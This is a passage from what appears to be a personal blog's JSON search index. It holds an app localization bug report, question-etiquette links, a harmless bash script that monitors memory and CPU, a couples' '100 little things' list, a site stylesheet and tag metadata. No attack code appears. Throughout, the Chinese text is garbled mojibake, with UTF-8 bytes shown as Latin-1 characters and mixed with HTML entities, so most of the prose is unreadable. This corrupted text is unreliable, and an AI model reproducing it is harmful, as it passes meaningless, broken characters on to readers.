åï¼Œé»˜è®¤åˆ†ç»„åç§°æ˜¾ç¤ºå¼‚å¸¸ã€‚ â€¢ ä¾‹å¦‚ï¼Œåº”è¯¥æ˜¾ç¤º â€œæˆ‘çš„å¥½å‹â€ï¼Œä½†å®é™…æ˜¾ç¤ºä¸º â€œDfName (1äºº)â€ï¼ˆè§æˆªå›¾ï¼‰ã€‚ å¤ç°æ­¥éª¤ æ‰“å¼€ Appï¼Œè¿›å…¥ è®¾ç½® é¡µé¢ã€‚ åˆ‡æ¢ç³»ç»Ÿè¯­è¨€æˆ– App è¯­è¨€ä¸º ç¹ä½“ä¸­æ–‡ã€‚ è¿”å› é€šè®¯å½•ï¼ŒæŸ¥çœ‹ é»˜è®¤åˆ†ç»„åç§°ã€‚ é¢„æœŸç»“æœ â€¢ é»˜è®¤åˆ†ç»„åç§°åº”è¯¥æ­£ç¡®åŒ¹é…ç¹ä½“ä¸­æ–‡ç¿»è¯‘ï¼Œå¦‚ â€œæˆ‘çš„å¥½å‹ â€ã€‚ å®é™…ç»“æœ â€¢ ç›®å‰åˆ†ç»„åç§° æ˜¾ç¤ºé”™è¯¯ï¼Œå˜æˆ â€œDfNameâ€ï¼Œç–‘ä¼¼æœªæ­£ç¡®åŠ è½½æœ¬åœ°åŒ–æ–‡æœ¬ã€‚ å¯èƒ½åŸå› ï¼ˆå¼€å‘å¯åˆæ­¥æ’æŸ¥ï¼‰ â€¢ æœ¬åœ°åŒ–é—®é¢˜ï¼šæ˜¯å¦ç¼ºå°‘ç¹ä½“ä¸­æ–‡çš„æœ¬åœ°åŒ–ç¿»è¯‘ï¼Ÿ â€¢ é»˜è®¤å€¼é—®é¢˜ï¼šå¦‚æœæœ¬åœ°åŒ–å¤±è´¥ï¼Œæ˜¯å¦ fallback åˆ°é”™è¯¯çš„é»˜è®¤å€¼ â€œDfNameâ€ï¼Ÿ â€¢ ç¼“å­˜é—®é¢˜ï¼šåˆ‡æ¢è¯­è¨€åï¼Œæ˜¯å¦ UI æˆ–æ•°æ®æœªæ­£ç¡®åˆ·æ–°ï¼Ÿ ç¯å¢ƒä¿¡æ¯ â€¢ iOS ç‰ˆæœ¬ï¼šiOS 17.x â€¢ App ç‰ˆæœ¬ï¼šv1.0.0 â€¢ è®¾å¤‡ï¼šiPhone 14 Pro how to talkhttps://dontasktoask.com/https://xyproblem.info/https://nohello.net/zh-cn/https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md debian&#x2F;linuxå®æ—¶æ˜¾ç¤ºcpuè„šæœ¬bash è„šæœ¬ å®šæ—¶æ˜¾ç¤ºå†…å­˜ 123456789101112131415161718192021222324252627282930313233#!/bin/bash# å®šä¹‰é¢œè‰²å¸¸é‡ç”¨äºè¾“å‡ºæ ¼å¼åŒ–RED=&#x27;\\033[0;31m&#x27;GREEN=&#x27;\\033[0;32m&#x27;YELLOW=&#x27;\\033[1;33m&#x27;NC=&#x27;\\033[0m&#x27; # æ— è‰²# å‡½æ•°ï¼šè·å–å†…å­˜ä½¿ç”¨æƒ…å†µget_memory_usage() &#123; free -m | grep Mem: | awk &#x27;&#123;print $4&#125;&#x27;&#125;# å‡½æ•°ï¼šè·å–CPUä½¿ç”¨ç‡get_cpu_usage() &#123; top -bn1 | grep &#x27;Cpu(s)&#x27; | awk &#x27;&#123;print $2&#125;&#x27; # è·å–æ€»CPUä½¿ç”¨ç‡ï¼ˆç™¾åˆ†æ¯”ï¼‰&#125;# è®¾ç½®é»˜è®¤æ—¶é—´é—´éš”ä¸º1ç§’ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦è°ƒæ•´INTERVAL=1# æç¤ºç”¨æˆ·è¾“å…¥ç›‘æ§çš„æ—¶é—´é—´éš”echo &quot;è¯·è¾“å…¥ç›‘æ§æ—¶é—´é—´éš”ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼Œé»˜è®¤ä¸º1ç§’ï¼‰ï¼š&quot;read INTERVAL# æŒç»­ç›‘æ§ç³»ç»Ÿèµ„æºä½¿ç”¨æƒ…å†µwhile true; do echo -e &quot;\\n$GREEN=$(date +%Y-%m-%d_%H:%M:%S)$NC&quot; echo -e &quot;$YELLOWå†…å­˜å‰©ä½™ï¼š$(get_memory_usage) MB$NC&quot; echo -e &quot;$RED CPUä½¿ç”¨ç‡ï¼š$(get_cpu_usage)%$NC&quot; sleep $INTERVALdone .&#x2F;st.sh","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"100ä»¶å°äº‹","slug":"T100","date":"2023-02-20T02:27:36.000Z","updated":"2025-01-27T09:08:53.393Z","comments":true,"path":"2023/02/20/T100/","permalink":"https://banjinmei.github.io/2023/02/20/T100/","excerpt":"","text":"æ‰‹ç‰µæ‰‹é€›è¡— ä¸€èµ·çœ‹æµ· ä¸€èµ·çœ‹é›ª å–‚æˆ‘åƒä¸œè¥¿ ä¸€èµ·å †é›ªäºº ä¸€èµ·åæ‘©å¤©è½® ä¸€èµ·æ¶ä½œå‰§ ä¸€èµ·åæµ·ç›—èˆ¹ åƒåŒä¸€æ¯å†°æ·‡æ·‹ ä¸€èµ·æ¬ä¸œè¥¿ ä¸€èµ·å¸ƒç½®æˆ‘ä»¬çš„å°çª ä¸€èµ·çœ‹æ—¥å‡º ä¸€èµ·çœ‹ææ€–ç‰‡ é€æƒŠå–œå°ç¤¼ç‰© ä¸ºæˆ‘åšé¡¿é¥­ ä¸€èµ·çœ‹çˆ±æƒ…ç‰‡ ä¸€èµ·çœ‹æ—¥è½ ä¸€èµ·æ•°æ˜Ÿæ˜Ÿ ä¸€èµ·æ´—è¡£æœ ä¸€èµ·å¬åŒä¸€é¦–æ›²å­ åœ¨æœ‹å‹é¢å‰ä»‹ç»æˆ‘ æŠŠè‚©è†€å€Ÿç»™æˆ‘é  ä¸ºæˆ‘æ“¦çœ¼æ³ª å”±æ­Œç»™æˆ‘å¬ ä¸ºæˆ‘å†™ç¯‡æ—¥è®° åœ¨å¤§è¡—ä¸ŠèƒŒæˆ‘ éšå«éšåˆ° ä¸€èµ·çœ‹çƒèµ› æ¯”èµ›å•ƒè¥¿ç“œ åœ¨æ²™æ»©ä¸Šç”»å¿ƒ ä¸€èµ·æ²¡å½¢è±¡çš„å¤§å« ä¸€èµ·ç†¬å¤œç©æ¸¸æˆ ä¸ºæˆ‘ç³»é‹å¸¦ ä¸€èµ·æ‹‰ç²‘ ä¸€èµ·å‘å‘† ä¸€èµ·è¿‡æˆ‘ä»¬çš„çºªå¿µæ—¥ ä¸€èµ·åšé™¶ç“· ä¸€èµ·è®¸æ„¿ ä¸€èµ·åšè›‹ç³• å­¦å¯¹æ–¹è¯´è¯ ä¸€èµ·æ¨¡ä»¿æç¬‘çš„äº‹æƒ… ä¸ºæˆ‘å‰ªæŒ‡ç”² åƒæˆ‘å‰©ä¸‹çš„é¥­é¥­ æŠŠä½ æ¬ºè´Ÿçš„å¯¹æˆ‘æ²¡è¾™ ä¸€èµ·æ‰“æ°´ä»— ä¸€èµ·æ‹ç…§ç‰‡ ä¸€èµ·éª‘è„šè¸è½¦ æˆ´åŒä¸€æ¡å›´å·¾ æˆ´åŒä¸€åŒæ‰‹å¥— è®²æ•…äº‹å“„æˆ‘ç¡è§‰ ä¸€èµ·åƒæ£‰èŠ±ç³– ä¸€èµ·å”±æ­Œ ä¸€èµ·æ·‹é›¨ ä¸€èµ·é¢å¯¹æ‰€æœ‰éš¾å ª ä¸€èµ·çˆ¬å±± ä¸€èµ·éœ²è¥ ä¸€èµ·è·‘æ­¥ ä¸€èµ·å‚»ç¬‘ ä¸€èµ·åƒè·¯è¾¹æ‘Š ä¸€èµ·å»çŒ«å’– ç©¿æƒ…ä¾£è£…æ˜¾æ‘† ä¸€èµ·æ‰“ç¾½æ¯›çƒ ä¸€èµ·åƒçˆ±åƒçš„ä¸œè¥¿åˆ°å ä¸€èµ·è¸©é©¬è·¯åˆ°è„šè½¯ ä¸€èµ·å»æ—…è¡Œ ä¸€èµ·å»åŠ¨ç‰©å›­ å’¬ä¸€ä¸‹ä½ çš„è„¸é¢Š å¯¹æˆ‘è¯´æ™šå®‰ ä¸€èµ·çœ‹ç”µå½± ä¸€èµ·ä¹°èœ æ¯”èµ›çŸ³å¤´å‰ªåˆ€å¸ƒ ä¸€èµ·è§å¯¹æ–¹çš„æœ‹å‹ ä¸€èµ·åšé¬¼è„¸ ä¸€èµ·èµ°éä¸–ç•Œå„åœ° ä¸€èµ·åƒå¤§é¤ï¼Œç‰µæ‰‹è¿›å»ï¼Œæ‰¶å¢™å‡ºæ¥ ä¸€èµ·æ‰æ°”çƒèµ¢å¥–å“ ç«™åœ¨é©¬è·¯çš„ä¸¤ä¾§å¤§å–Š çœ‹ä½ æ‰“åœºæ¯”èµ› ä¸€èµ·çœ‹æ¼”å”±ä¼š ä¸€èµ·æ²¿é“è½¨ ä¸€èµ·ååœ°é“ ä¸€èµ·æ”¾é£ç­ ä¸€èµ·çœ‹èŠ±ç”° è¶ä½ ç¡è§‰å·äº²ä½ ä¸€ä¸‹ ä¸€èµ·æ”¾å­”æ˜ç¯ ä¸€èµ·é’“é±¼ ä¸€èµ·ä¸‹æ£‹ ä¸€èµ·åœ¨çƒˆæ—¥ä¸‹æš´æ™’ æ‰‹æœºå±ä¿è®¾ç½®å¯¹æ–¹çš„ç…§ç‰‡ ä¸€èµ·æ•·é¢è†œ ä¸€èµ·æå¯¹æ–¹çš„è„¸ æ‰“èµŒå„ç§å„æ ·çš„äº‹ ä¸€èµ·çœ‹çƒŸç« åœ¨æ ‘ä¸‹åŸ‹ä¸‹æˆ‘ä»¬çš„çº¦å®š å»æµ·è¾¹æ”¾æ¼‚æµç“¶ æ‹ä¸€æ¬¡å©šçº±ç…§ æ±‚å©š ç»“å©š å®Œæˆäººç”Ÿå„é¡¹å¤§äº‹ ç™½å¤´å•è€ @charset \"UTF-8\";a,abbr,address,article,aside,audio,b,blockquote,body,canvas,cite,code,dd,del,details,dfn,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,html,i,iframe,img,kbd,label,li,mark,nav,object,ol,output,p,pre,q,ruby,s,samp,section,small,span,strong,sub,summary,sup,table,tbody,td,tfoot,th,thead,time,tr,u,ul,var,video { margin: 0; padding: 0; border: 0; vertical-align: baseline; font: inherit; font-size: 100% } .float_btns {display:none} .sidebar {display:none} body { line-height: 1; -webkit-text-size-adjust: none; -ms-overflow-style: scrollbar } article,aside,details,figcaption,figure,footer,header,hgroup,nav,section { display: block } button,input,select,textarea { resize: none } ol,ul { list-style: none } blockquote,q { quotes: none } blockquote:after,blockquote:before,q:after,q:before { content: ''; content: none } table { border-collapse: collapse; border-spacing: 0 } *,:after,:before { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box } body { background: #FFF } html { overflow-x: hidden; -ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100% } ::-moz-selection { background-color: #EEE; color: #000 } ::selection { background-color: #EEE; color: #000 } body,input,select,textarea { color: #444; font-weight: 400; font-size: .875rem; font-family: -apple-system,BlinkMacSystemFont,Avenir,\"Avenir Next\",\"Segoe UI\",Roboto,Oxygen,Ubuntu,Cantarell,\"Fira Sans\",\"Droid Sans\",\"Helvetica Neue\",sans-serif; line-height: 1.65; text-rendering: geometricPrecision; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale } a { color: #f15bb5; text-decoration: none } a:hover { color: #f15bb5 } blockquote,dl,ol,p,pre,table,ul { margin: 10px 0 } blockquote,dl,form,ol,p,pre,ul { letter-spacing: 1px } b,strong { color: #555; font-weight: 700 } em,i { font-style: italic } h1,h2,h3,h4,h5,h6 { margin-top: 0; margin-bottom: .25em; color: inherit; font-weight: 500 } h1 { font-size: 2rem } h2 { font-size: 1.6rem } h3 { font-size: 1.4rem } h4 { font-size: 1.2rem } h5 { font-size: 1rem } h6 { font-size: .8rem } sub { position: relative; top: .5em; font-size: .8em } sup { position: relative; top: -.5em; font-size: .8em } blockquote { padding: 0 15px; border-left: solid 4px #ddd } code { margin: .5em .5em; padding: .25em .65em; border: solid 1px rgba(144,144,144,.25); border-radius: 4px; background: rgba(144,144,144,.075); font-size: .9em } pre { font-size: .9em; -webkit-overflow-scrolling: touch } pre code { display: block; overflow-x: auto; padding: 1em 1.5em; line-height: 1.75 } ol { padding-left: 1.25em; list-style: decimal } ol li { padding-left: .25em } ul { padding-left: 1em; list-style: disc } ul li { padding-left: .5em } dl dt { display: block; margin: 0 0 1em 0; font-weight: 700 } dl dd { margin-left: 2em } hr { margin: 1em 0; border: 0; border-bottom: solid 1px rgba(144,144,144,.25) } hr.major { margin: 3em 0 } label { display: block; margin: 0 0 1em 0; color: #555; font-weight: 700; font-size: .9em } table { overflow: auto; width: 100%; border-collapse: collapse; word-wrap: normal; font-size: 12px; border-spacing: 0; word-break: normal } table tbody,table thead { background: #f8f8f8 } table td,table th { padding: 6px 13px; border: 1px solid #ddd } table th { font-weight: 700 } table tbody tr:hover { background: #efefef } mark { padding: .05rem; border-radius: .1rem; background: #b9e5ff; color: #555 } ::-webkit-input-placeholder { color: #bbb!important; opacity: 1 } :-moz-placeholder { color: #bbb!important; opacity: 1 } ::-moz-placeholder { color: #bbb!important; opacity: 1 } :-ms-input-placeholder { color: #bbb!important; opacity: 1 } .button,button,input[type=button],input[type=email],input[type=password],input[type=reset],input[type=submit],input[type=tel],input[type=text],select,textarea { outline: 0; border: 0; border-radius: 4px; text-decoration: none; -moz-appearance: none; -webkit-appearance: none; -ms-appearance: none; appearance: none } input[type=email],input[type=password],input[type=tel],input[type=text],select,textarea { display: block; padding: 0 1em; width: 100%; border: solid 1px rgba(144,144,144,.25); background: rgba(144,144,144,.075); color: inherit } input[type=email],input[type=password],input[type=text],select { height: 2.75em } textarea { padding: .75em 1em } .select-wrapper { position: relative; display: block; text-decoration: none } .select-wrapper:before { content: \"\\e815\"; text-transform: none!important; font-weight: 400; font-style: normal; font-family: fontello; -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased } .select-wrapper:before { position: absolute; top: 0; right: 0; display: block; width: 2.75em; height: 2.75em; color: rgba(144,144,144,.25); text-align: center; line-height: 2.75em; pointer-events: none } .select-wrapper select::-ms-expand { display: none } input[type=checkbox],input[type=radio] { z-index: -1; float: left; display: block; margin-right: -2em; width: 1em; opacity: 0; -moz-appearance: none; -webkit-appearance: none; -ms-appearance: none; appearance: none } input[type=checkbox]+label,input[type=radio]+label { position: relative; display: inline-block; padding-right: .75em; padding-left: 2.4em; color: #444; text-decoration: none; font-weight: 400; font-size: 1em; cursor: pointer } input[type=checkbox]+label:before,input[type=radio]+label:before { text-transform: none!important; font-weight: 400; font-style: normal; font-family: fontello; -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased } input[type=checkbox]+label:before,input[type=radio]+label:before { position: absolute; top: 0; left: 0; display: inline-block; width: 1.65em; height: 1.65em; border: solid 1px rgba(144,144,144,.25); border-radius: 4px; background: rgba(144,144,144,.075); content: ''; text-align: center; line-height: 1.58125em } input[type=checkbox]:checked+label:before,input[type=radio]:checked+label:before { border-color: #5a5a5a; background: #5a5a5a; color: #fff; content: '\\2713' } input[type=checkbox]+label:before { border-radius: 4px } input[type=radio]+label:before { border-radius: 100% } select { padding-right: 1.1rem; background: rgba(144,144,144,.075) url(\"data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'%3E%3Cpath fill='%23667189' d='M2 0L0 2h4zm0 5L0 3h4z'/%3E%3C/svg%3E\") no-repeat right .35rem center/.4rem .5rem } select::-ms-expand { display: none } select[multiple] { height: auto } .button,button,input[type=button],input[type=reset],input[type=submit] { display: inline-block; padding: 0 1.5em; height: 2.85em; background-color: #5a5a5a; color: #fff!important; text-align: center; white-space: nowrap; letter-spacing: 2px; line-height: 2.95em; cursor: pointer; -webkit-transition: background-color .2s ease-in-out,color .2s ease-in-out; -moz-transition: background-color .2s ease-in-out,color .2s ease-in-out; transition: background-color .2s ease-in-out,color .2s ease-in-out; -ms-transition: background-color .2s ease-in-out,color .2s ease-in-out } .button,button:hover,input[type=button]:hover,input[type=reset]:hover,input[type=submit]:hover { background-color: #676767 } .button,button:active,input[type=button]:active,input[type=reset]:active,input[type=submit]:active { background-color: #4d4d4d } .button.alt,button.alt,input[type=button].alt,input[type=reset].alt,input[type=submit].alt { background-color: transparent; box-shadow: inset 0 0 0 2px rgba(144,144,144,.25); color: #555!important } .button.alt:hover,button.alt:hover,input[type=button].alt:hover,input[type=reset].alt:hover,input[type=submit].alt:hover { background-color: rgba(144,144,144,.075) } .button.alt:active,button.alt:active,input[type=button].alt:active,input[type=reset].alt:active,input[type=submit].alt:active { background-color: rgba(144,144,144,.2) } .button.disabled,.button:disabled,button.disabled,button:disabled,input[type=button].disabled,input[type=button]:disabled,input[type=reset].disabled,input[type=reset]:disabled,input[type=submit].disabled,input[type=submit]:disabled { background-color: #444!important; box-shadow: inset 0 -.15em 0 0 rgba(0,0,0,.15); color: #fff!important; opacity: .25; cursor: not-allowed } .container { margin-right: auto; margin-left: auto; padding-right: .4rem; padding-left: .4rem; width: 100% } .container.grid-xl { max-width: 1296px } .container.grid-lg { max-width: 976px } .container.grid-md { max-width: 856px } .container.grid-sm { max-width: 680px } .container.grid-xs { max-width: 496px } .show-lg,.show-md,.show-sm,.show-xl,.show-xs { display: none!important } .columns { display: flex; display: -ms-flexbox; margin-right: -.4rem; margin-left: -.4rem; -ms-flex-wrap: wrap; flex-wrap: wrap } .columns.col-gapless { margin-right: 0; margin-left: 0 } .columns.col-gapless>.column { padding-right: 0; padding-left: 0 } .columns.col-oneline { overflow-x: auto; -ms-flex-wrap: nowrap; flex-wrap: nowrap } .column { padding-right: .4rem; padding-left: .4rem; max-width: 100%; -ms-flex: 1; flex: 1 } .column.col-1,.column.col-10,.column.col-11,.column.col-12,.column.col-2,.column.col-3,.column.col-4,.column.col-5,.column.col-6,.column.col-7,.column.col-8,.column.col-9 { -ms-flex: none; flex: none } .s-content .column { padding: .5rem } .col-12 { width: 100% } .col-11 { width: 91.66666667% } .col-10 { width: 83.33333333% } .col-9 { width: 75% } .col-8 { width: 66.66666667% } .col-7 { width: 58.33333333% } .col-6 { width: 50% } .col-5 { width: 41.66666667% } .col-4 { width: 33.33333333% } .col-3 { width: 25% } .col-2 { width: 16.66666667% } .col-1 { width: 8.33333333% } .col-auto { width: auto; max-width: none; -ms-flex: 0 0 auto; flex: 0 0 auto } .col-mx-auto { margin-right: auto; margin-left: auto } .col-ml-auto { margin-left: auto } .col-mr-auto { margin-right: auto } @media (max-width: 1280px) { .col-xl-1,.col-xl-10,.col-xl-11,.col-xl-12,.col-xl-2,.col-xl-3,.col-xl-4,.col-xl-5,.col-xl-6,.col-xl-7,.col-xl-8,.col-xl-9 { -ms-flex:none; flex: none } .col-xl-12 { width: 100% } .col-xl-11 { width: 91.66666667% } .col-xl-10 { width: 83.33333333% } .col-xl-9 { width: 75% } .col-xl-8 { width: 66.66666667% } .col-xl-7 { width: 58.33333333% } .col-xl-6 { width: 50% } .col-xl-5 { width: 41.66666667% } .col-xl-4 { width: 33.33333333% } .col-xl-3 { width: 25% } .col-xl-2 { width: 16.66666667% } .col-xl-1 { width: 8.33333333% } .hide-xl { display: none!important } .show-xl { display: block!important } } @media (max-width: 960px) { .col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9 { -ms-flex:none; flex: none } .col-lg-12 { width: 100% } .col-lg-11 { width: 91.66666667% } .col-lg-10 { width: 83.33333333% } .col-lg-9 { width: 75% } .col-lg-8 { width: 66.66666667% } .col-lg-7 { width: 58.33333333% } .col-lg-6 { width: 50% } .col-lg-5 { width: 41.66666667% } .col-lg-4 { width: 33.33333333% } .col-lg-3 { width: 25% } .col-lg-2 { width: 16.66666667% } .col-lg-1 { width: 8.33333333% } .hide-lg { display: none!important } .show-lg { display: block!important } } @media (max-width: 840px) { .col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9 { -ms-flex:none; flex: none } .col-md-12 { width: 100% } .col-md-11 { width: 91.66666667% } .col-md-10 { width: 83.33333333% } .col-md-9 { width: 75% } .col-md-8 { width: 66.66666667% } .col-md-7 { width: 58.33333333% } .col-md-6 { width: 50% } .col-md-5 { width: 41.66666667% } .col-md-4 { width: 33.33333333% } .col-md-3 { width: 25% } .col-md-2 { width: 16.66666667% } .col-md-1 { width: 8.33333333% } .hide-md { display: none!important } .show-md { display: block!important } } @media (max-width: 600px) { .col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9 { -ms-flex:none; flex: none } .col-sm-12 { width: 100% } .col-sm-11 { width: 91.66666667% } .col-sm-10 { width: 83.33333333% } .col-sm-9 { width: 75% } .col-sm-8 { width: 66.66666667% } .col-sm-7 { width: 58.33333333% } .col-sm-6 { width: 50% } .col-sm-5 { width: 41.66666667% } .col-sm-4 { width: 33.33333333% } .col-sm-3 { width: 25% } .col-sm-2 { width: 16.66666667% } .col-sm-1 { width: 8.33333333% } .hide-sm { display: none!important } .show-sm { display: block!important } } @media (max-width: 480px) { .col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9 { -ms-flex:none; flex: none } .col-xs-12 { width: 100% } .col-xs-11 { width: 91.66666667% } .col-xs-10 { width: 83.33333333% } .col-xs-9 { width: 75% } .col-xs-8 { width: 66.66666667% } .col-xs-7 { width: 58.33333333% } .col-xs-6 { width: 50% } .col-xs-5 { width: 41.66666667% } .col-xs-4 { width: 33.33333333% } .col-xs-3 { width: 25% } .col-xs-2 { width: 16.66666667% } .col-xs-1 { width: 8.33333333% } .hide-xs { display: none!important } .show-xs { display: block!important } } .horizontal-align { display: flex; justify-content: center } .header { padding: 50px 0 0 } .header .column { padding: 0 } .logo { display: inline-block; margin: 0 20px 0 10px; vertical-align: middle; font-size: 72px } .logo .i-love { position: relative; top: -6px; width: 69px; height: 69px; background: url(img/love.png) no-repeat 0 0; vertical-align: middle } .ico { display: inline-block; width: 16px; height: 16px; vertical-align: middle } .logo a { color: #383838; font-weight: 700 } .description { display: inline-block; vertical-align: middle; letter-spacing: normal; font-size: 14px } .description a { border-bottom: 1px solid #f15bb5 } .posts { padding: 0 } .posts ol { margin-left: -30px; padding-left: 30px } .posts li { padding: 10px; border-top: 1px solid #e5e5e5 } .posts li p { margin: 0 } .posts li:hover { background: #f4f4f4 } .footer { color: #999; font-size: 12px } .footer p:first-child { margin-top: 0; padding-top: 1rem; border-top: 1px solid #e6e6e6 } .footer .column { padding-right: 0; padding-left: 0 } .comments .column { padding: 0 } .comment-form input { padding: 0 40px 0 18px; width: 100%; height: 2.75em; outline: 0; border: 1px solid rgba(184,197,214,.2); background-color: #fff; -webkit-box-shadow: 0 1px 4px rgba(0,0,0,.1); box-shadow: 0 1px 4px rgba(0,0,0,.1); -webkit-appearance: none } .comment-form textarea { outline: 0; border: 1px solid rgba(184,197,214,.2); background-color: #fff; -webkit-box-shadow: 0 1px 4px rgba(0,0,0,.1); box-shadow: 0 1px 4px rgba(0,0,0,.1); -webkit-appearance: none } .comment-form button { margin-top: 16px; background-color: #f36; color: #fff!important } .comment-hr { margin: 20px 0; border-top: 2px solid #f15bb5 } .comment-list { margin: 0; padding: 0; list-style-type: none } .comment-header { font-size: 12px } .comment-author { color: #f15bb5 } .comment-content { margin-left: 60px; border-radius: 5px; color: #999; font-size: 12px } .comment-content p { margin: 0 } .arrow { position: absolute; top: 4px; left: -5px; display: inline-block; overflow: hidden; width: 0; height: 0; border-width: 4px 4px 4px 0; font: 0/0 arial; border-right-color: #dcdcdc } .larr-in { left: -4px; border-right-color: #f8faff } .larr,.larr-in { border-right-style: solid!important } .larr,.larr-in { border-top-color: transparent!important; border-bottom-color: transparent!important; border-top-style: dashed!important; border-bottom-style: dashed!important } .comment-header .avatar { float: left; display: inline-block; width: 50px; height: 50px; border: 1px solid #eaeaea; border-radius: 50% } .comment-reply { float: right } #cancel-comment-reply-link { margin-left: 16px } .comment-view { padding: 4px 0; min-height: 60px; border-bottom: 1px dotted #e5e5e5 } .comment-child { padding-left: 60px } .lists-navigator { margin: 20px 0 } .lists-navigator ol { padding: 0 10px; list-style: none; text-align: center } .lists-navigator ol li { display: inline-block; color: #999 } .lists-navigator ol li a { padding: 0 5px; color: #999 } .lists-navigator ol li.current a { color: #f15bb5 } .done { color: #999; font-style: italic } .comment-author-approve { padding: .1rem .25rem; border-radius: .25rem; background-color: #f36; color: #FFF } .top { float: right } .comment-author-at { float: left; margin-right: 5px } .links { border-top: 1px solid #e6e6e6 } .links ul { overflow: hidden; margin: 0; padding: 0; margin-top: 16px; list-style: none } .links ul li { position: relative; float: left; width: 50%; border-radius: 5px; list-style: none } .links ul li:hover { background: rgba(155,155,155,.1) } .links ul li a { display: block; padding: 0 10px 0 90px; height: 90px; color: #444 } .links ul li a img { position: absolute; top: 15px; left: 15px; margin: 0; width: 60px; height: 60px; border-radius: 50%; cursor: pointer } .links ul li a h4 { padding-top: 20px; font-size: 13px } .links ul li a p { font-size: 12px } .links ul li a h4,.links ul li a p { overflow: hidden; text-overflow: ellipsis; white-space: nowrap } @media (max-width: 720px) { .header .column { padding:.5rem } .posts ol { margin-left: 0; padding: 0 40px } .comments .column { padding: 0 15px } .footer .column { padding: .5rem 15px } .links ul li { width: 100% } } @media (max-width: 636px) { .header { padding:0 } .header .column { text-align: center } }","categories":[{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"https://banjinmei.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[],"author":"mu"}],"categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"https://banjinmei.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"AES","slug":"AES","permalink":"https://banjinmei.github.io/tags/AES/"},{"name":"Debian","slug":"Debian","permalink":"https://banjinmei.github.io/tags/Debian/"},{"name":"MSSQL","slug":"MSSQL","permalink":"https://banjinmei.github.io/tags/MSSQL/"},{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"},{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"},{"name":"TTS","slug":"TTS","permalink":"https://banjinmei.github.io/tags/TTS/"},{"name":"Video","slug":"Video","permalink":"https://banjinmei.github.io/tags/Video/"},{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"},{"name":"p12","slug":"p12","permalink":"https://banjinmei.github.io/tags/p12/"},{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"socket","slug":"socket","permalink":"https://banjinmei.github.io/tags/socket/"},{"name":"ssl","slug":"ssl","permalink":"https://banjinmei.github.io/tags/ssl/"},{"name":"https","slug":"https","permalink":"https://banjinmei.github.io/tags/https/"},{"name":"nginx","slug":"nginx","permalink":"https://banjinmei.github.io/tags/nginx/"},{"name":"ras","slug":"ras","permalink":"https://banjinmei.github.io/tags/ras/"},{"name":".net9","slug":"net9","permalink":"https://banjinmei.github.io/tags/net9/"},{"name":"vps","slug":"vps","permalink":"https://banjinmei.github.io/tags/vps/"},{"name":"vm","slug":"vm","permalink":"https://banjinmei.github.io/tags/vm/"},{"name":"win11","slug":"win11","permalink":"https://banjinmei.github.io/tags/win11/"},{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"},{"name":"iRedMail","slug":"iRedMail","permalink":"https://banjinmei.github.io/tags/iRedMail/"},{"name":"smtp","slug":"smtp","permalink":"https://banjinmei.github.io/tags/smtp/"},{"name":"HarmonryOS","slug":"HarmonryOS","permalink":"https://banjinmei.github.io/tags/HarmonryOS/"},{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"},{"name":"ArkTS","slug":"ArkTS","permalink":"https://banjinmei.github.io/tags/ArkTS/"},{"name":"csharp","slug":"csharp","permalink":"https://banjinmei.github.io/tags/csharp/"},{"name":"python","slug":"python","permalink":"https://banjinmei.github.io/tags/python/"},{"name":"llama","slug":"llama","permalink":"https://banjinmei.github.io/tags/llama/"},{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"gRPC","slug":"gRPC","permalink":"https://banjinmei.github.io/tags/gRPC/"},{"name":".net9.0","slug":"net9-0","permalink":"https://banjinmei.github.io/tags/net9-0/"},{"name":"Navigation","slug":"Navigation","permalink":"https://banjinmei.github.io/tags/Navigation/"},{"name":"nav","slug":"nav","permalink":"https://banjinmei.github.io/tags/nav/"},{"name":"jwt","slug":"jwt","permalink":"https://banjinmei.github.io/tags/jwt/"},{"name":"token","slug":"token","permalink":"https://banjinmei.github.io/tags/token/"},{"name":"redis","slug":"redis","permalink":"https://banjinmei.github.io/tags/redis/"},{"name":"opencv","slug":"opencv","permalink":"https://banjinmei.github.io/tags/opencv/"},{"na